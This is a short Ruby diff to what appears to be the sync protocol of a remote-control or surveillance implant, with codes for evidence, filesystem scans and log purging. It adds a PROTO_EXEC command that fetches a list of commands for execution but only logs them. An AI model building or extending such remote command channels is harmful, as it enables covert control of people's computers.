@@ -36,6 +36,7 @@ module Command
   PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
   PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
   PROTO_PURGE         = 0x1a       # purge the log queue
+  PROTO_EXEC          = 0x1b       # execution of commands during sync
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
@@ -347,7 +348,29 @@ module Command
       trace :info, "PURGE -- No purge for me"
     end
   end
-  
+
+  # Protocol Exec
+  # ->  Crypt_K ( PROTO_EXEC )
+  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]] )
+  def receive_exec
+    trace :info, "EXEC"
+    resp = send_command(PROTO_EXEC)
+
+    # decode the response
+    command, tot, num = resp.unpack('I3')
+
+    if command == PROTO_OK then
+      trace :info, "EXEC : #{num} are available"
+      list = resp.slice(12, resp.length)
+      # print the list of downloads
+      list.unpascalize_ary.each do |command|
+        trace :info, "EXEC -- [#{command}]"
+      end
+    else
+      trace :info, "EXEC -- No downloads for me"
+    end
+  end
+
   # Protocol End
   # ->  Crypt_K ( PROTO_BYE )   
   # <-  Crypt_K ( PROTO_OK )  
